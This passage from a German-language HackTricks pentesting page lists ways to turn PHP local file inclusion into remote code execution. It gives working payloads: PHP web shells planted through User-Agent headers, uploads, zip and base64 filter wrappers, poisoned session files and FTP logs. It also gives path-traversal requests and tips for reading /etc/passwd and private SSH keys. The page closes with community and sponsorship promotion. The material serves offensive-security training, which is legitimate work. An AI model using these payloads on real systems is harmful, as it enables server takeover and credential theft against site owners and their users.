√Ñhnlich wie eine Protokolldatei, senden Sie den Payload im User-Agent, er wird im /proc/self/environ-Datei reflektiert.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### √úber den Upload

Wenn Sie eine Datei hochladen k√∂nnen, f√ºgen Sie einfach die Shell-Payload ein (z.B.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, in die Metadaten der Bilder/Dokumente/PDFs einzuf√ºgen.

### √úber den Upload einer Zip-Datei

Laden Sie eine ZIP-Datei hoch, die eine komprimierte PHP-Shell enth√§lt, und greifen Sie darauf zu:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### √úber PHP-Sitzungen

√úberpr√ºfen Sie, ob die Website PHP-Sitzungen (PHPSESSID) verwendet.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese Sitzungen in Dateien _/var/lib/php5/sess\\_\[PHPSESSID]\_ gespeichert.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Verwenden Sie LFI, um die PHP-Sitzungsdatei einzuschlie√üen
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### √úber SSH

Wenn SSH aktiv ist, √ºberpr√ºfen Sie, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuchen Sie auf **\<HOME>/.ssh/id\_rsa** zuzugreifen.

### √úber vsftpd-Protokoll

Die Protokolldateien f√ºr den FTP-Server vsftpd befinden sich unter **_/var/log/vsftpd.log_**. Wenn eine Local File Inclusion (LFI)-Schwachstelle besteht und der Zugriff auf einen freigegebenen vsftpd-Server m√∂glich ist, k√∂nnen die folgenden Schritte unternommen werden:

1. F√ºgen Sie w√§hrend des Anmeldevorgangs eine PHP-Payload in das Benutzernamenfeld ein.
2. Nach der Injektion verwenden Sie die LFI, um die Serverprotokolle aus **_/var/log/vsftpd.log_** abzurufen.

### √úber den PHP Base64-Filter (mit base64)

Wie in [diesem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Artikel gezeigt, ignoriert der PHP Base64-Filter einfach Nicht-Base64. Sie k√∂nnen dies verwenden, um die Dateierweiterungspr√ºfung zu umgehen: Wenn Sie Base64 bereitstellen, das mit ".php" endet, ignoriert es einfach den "." und f√ºgt "php" an das Base64 an. Hier ist ein Beispiel-Payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### √úber php-Filter (keine Datei erforderlich)

Dieses [**Writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) erkl√§rt, dass Sie **php-Filter verwenden k√∂nnen, um beliebigen Inhalt** als Ausgabe zu generieren. Das bedeutet im Grunde genommen, dass Sie **beliebigen PHP-Code generieren k√∂nnen**, der in die Include-Anweisung einbezogen wird, **ohne ihn in eine Datei schreiben zu m√ºssen**.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### √úber Segmentation Fault

**Laden** Sie eine Datei hoch, die vor√ºbergehend in `/tmp` gespeichert wird, und l√∂sen Sie dann im **selben Request** einen **Segmentation Fault** aus. Die **vor√ºbergehende Datei wird nicht gel√∂scht**, und Sie k√∂nnen danach suchen.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### √úber Nginx-Tempor√§rspeicherung von Dateien

Wenn Sie eine **Local File Inclusion** gefunden haben und **Nginx** vor PHP ausgef√ºhrt wird, k√∂nnen Sie m√∂glicherweise RCE mit der folgenden Technik erzielen:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### √úber PHP\_SESSION\_UPLOAD\_PROGRESS

Wenn Sie eine **Local File Inclusion** gefunden haben, auch wenn Sie **keine Sitzung** haben und `session.auto_start` auf `Off` steht. Wenn Sie die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten bereitstellen, aktiviert PHP die Sitzung f√ºr Sie. Sie k√∂nnten dies missbrauchen, um RCE zu erlangen:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### √úber tempor√§re Datei-Uploads in Windows

Wenn Sie eine **Local File Inclusion** gefunden haben und der Server unter **Windows** l√§uft, k√∂nnen Sie m√∂glicherweise RCE erlangen:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### √úber phpinfo() (file\_uploads = on)

Wenn Sie eine **Local File Inclusion** gefunden haben und eine Datei, die **phpinfo()** mit file\_uploads = on offenlegt, k√∂nnen Sie RCE erlangen:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### √úber compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Pfadoffenlegung

Wenn Sie eine **Local File Inclusion** gefunden haben und Sie den **Pfad der tempor√§ren Datei exfiltrieren k√∂nnen**, der **Server** jedoch **√ºberpr√ºft**, ob die **einzuschlie√üende Datei PHP-Markierungen enth√§lt**, k√∂nnen Sie versuchen, diese √úberpr√ºfung mit dieser **Race Condition** zu umgehen:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### √úber endloses Warten + Brute Force

Wenn Sie die LFI missbrauchen k√∂nnen, um **vor√ºbergehende Dateien hochzuladen** und den PHP-Code auf dem Server **anhaltend** zu machen, k√∂nnten Sie dann **Stunden damit verbringen, Dateinamen zu erraten**, um die vor√ºbergehende Datei zu finden:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Zu einem Fatal Error

Wenn Sie eine der Dateien `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` einbinden (Sie m√ºssen dieselbe Datei zweimal einbinden, um diesen Fehler auszul√∂sen).

**Ich wei√ü nicht, wie das n√ºtzlich sein k√∂nnte, aber es k√∂nnte sein.**\
_Auch wenn Sie einen PHP Fatal Error verursachen, werden tempor√§re PHP-Dateien gel√∂scht._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referenzen

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtigen Plattformupdates informiert.

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **bei und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!**

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.**

</details>
